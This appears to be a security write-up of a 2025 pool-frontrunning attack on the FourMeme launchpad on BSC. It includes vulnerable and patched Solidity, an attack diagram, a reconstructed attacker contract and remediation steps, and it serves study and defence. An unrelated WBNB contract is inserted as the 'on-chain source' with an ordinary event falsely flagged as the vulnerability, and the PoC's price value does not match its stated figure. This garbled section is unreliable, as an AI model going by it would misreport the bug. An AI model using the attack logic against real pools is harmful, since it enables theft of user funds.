# FourMeme — Pool Pre-emption Attack Before Liquidity Migration Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-10 |
| **Protocol** | FourMeme |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$186,000 (287 BNB) |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://bscscan.com/tx/0x0000000000000000000000000000000000000000000000000000000000000000) |
| **Vulnerable Contract** | FourMeme Launchpad (BSC) |
| **Root Cause** | Attacker pre-created a PancakeSwap pool with an extreme price before the official liquidity migration, inducing the platform to inject liquidity into the manipulated pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/FourMeme_exp.sol) |

---

## 1. Vulnerability Overview

FourMeme is a memecoin launchpad that automatically migrates liquidity to PancakeSwap after the initial sale completes. Before the official migration was executed, the attacker pre-created a PancakeSwap pool with an extremely inflated `sqrtPriceX96` value (approximately 368 trillion times the normal value). FourMeme's `addLiquidity` function did not validate the pre-existence of a pool or its initial price, causing it to inject liquidity into the manipulated pool. The attacker was able to extract a large amount of WBNB using only a minimal quantity of tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no validation of pool existence or initial price
function migrateToPool(address token, uint256 bnbAmount, uint256 tokenAmount) external {
    address pool = IFactory(factory).getPool(token, WBNB, fee);

    if (pool == address(0)) {
        // Create a new pool only when none exists
        pool = IFactory(factory).createPool(token, WBNB, fee);
        IPool(pool).initialize(calculateSqrtPrice(tokenAmount, bnbAmount));
    }
    // ❌ If pool already exists, liquidity is added without any price validation!
    // Liquidity is injected directly into the attacker's extreme-price pool

    INonfungiblePositionManager(npm).mint(
        MintParams({token0: token, token1: WBNB, ...})
    );
}

// ✅ Safe code: validates pool initial price
function migrateToPool(address token, uint256 bnbAmount, uint256 tokenAmount) external {
    address pool = IFactory(factory).getPool(token, WBNB, fee);

    if (pool != address(0)) {
        // Validate that the existing pool's current price is within the expected range
        (uint160 sqrtPriceX96,,,,,,) = IPool(pool).slot0();
        uint160 expectedPrice = calculateSqrtPrice(tokenAmount, bnbAmount);
        require(
            sqrtPriceX96 >= expectedPrice * 90 / 100 &&
            sqrtPriceX96 <= expectedPrice * 110 / 100,
            "Pool price manipulated"
        );
    } else {
        pool = IFactory(factory).createPool(token, WBNB, fee);
        IPool(pool).initialize(calculateSqrtPrice(tokenAmount, bnbAmount));
    }
    // Safely add liquidity
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: WBNB.sol
contract WBNB {
    string public name     = "Wrapped BNB";
    string public symbol   = "WBNB";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);  // ❌ vulnerability
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    function() public payable {
        deposit();
    }
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return this.balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
    public
    returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        Transfer(src, dst, wad);

        return true;
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Purchase a small amount of meme tokens from FourMeme (minimal BNB)
  │
  ├─→ [2] [Front-run] Create PancakeSwap pool before the official migration
  │         └─ sqrtPriceX96: 368 trillion × normal value (extreme high price)
  │            Effective price ratio: billions of BNB per token
  │
  ├─→ [3] FourMeme's official liquidity migration executes
  │         └─ addLiquidity() → detects existing pool
  │            Injects WBNB into manipulated pool with no price validation
  │
  ├─→ [4] Attacker: swaps minimal tokens for large amount of WBNB
  │         └─ Due to manipulated price: tiny token amount = massive WBNB output
  │
  └─→ [5] Profit: ~287 BNB (~$186,000)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract FourMemeAttacker {
    address constant PANCAKE_FACTORY = /* PancakeSwap V3 Factory */;
    address constant PANCAKE_NPM = /* NonFungiblePositionManager */;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function attack(address memeToken) external payable {
        // [1] Purchase a small amount of meme tokens from FourMeme
        IFourMeme(fourMeme).buyToken{value: 0.001 ether}(memeToken);

        // [2] Pre-empt pool creation with an extremely high sqrtPriceX96
        // Set to approximately 368 trillion times the normal price
        uint160 extremeSqrtPrice = type(uint160).max / 2; // extreme high price
        address pool = IPancakeV3Factory(PANCAKE_FACTORY).createAndInitializePoolIfNecessary(
            memeToken, WBNB, 500, extremeSqrtPrice
        );

        // [3] FourMeme migrates liquidity into this pool (triggered automatically)
        // → Platform injects a large amount of WBNB into the manipulated pool

        // [4] Swap minimal tokens for a large amount of WBNB
        uint256 tokenBalance = IERC20(memeToken).balanceOf(address(this));
        IERC20(memeToken).approve(PANCAKE_ROUTER, tokenBalance);
        // Due to extreme price: tiny token amount → massive WBNB output
        IPancakeRouter(PANCAKE_ROUTER).exactInputSingle(...);

        // Result: ~287 BNB extracted
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Pool Initialization Frontrunning |
| **CWE** | CWE-362: Race Condition |
| **Attack Vector** | External (transaction ordering manipulation) |
| **DApp Category** | Token Launchpad |
| **Impact** | 287 WBNB drained from liquidity pool |

## 6. Remediation Recommendations

1. **Pre-migration pool validation**: Before migrating liquidity, always verify that the pool's current price falls within the expected range
2. **Direct pool creation**: Have the launchpad itself create and initialize the pool to prevent third-party pre-emption
3. **Price range constraints**: Define an acceptable initial price range for the pool and block migration if the price falls outside that range
4. **Commit-Reveal pattern**: Pre-commit and verify the target pool address before executing the liquidity migration

## 7. Lessons Learned

- When a launchpad automatically migrates liquidity to an external AMM, failing to validate the state of the target pool makes the protocol vulnerable to frontrunning attacks.
- The `sqrtPriceX96` parameter in Uniswap V3/PancakeSwap V3 can be set to extreme values, so protocols must always guard against price manipulation attacks that exploit this.
- Logic that depends on transaction ordering (first-come-first-served pool creation) is a primary target for MEV/frontrunning attacks.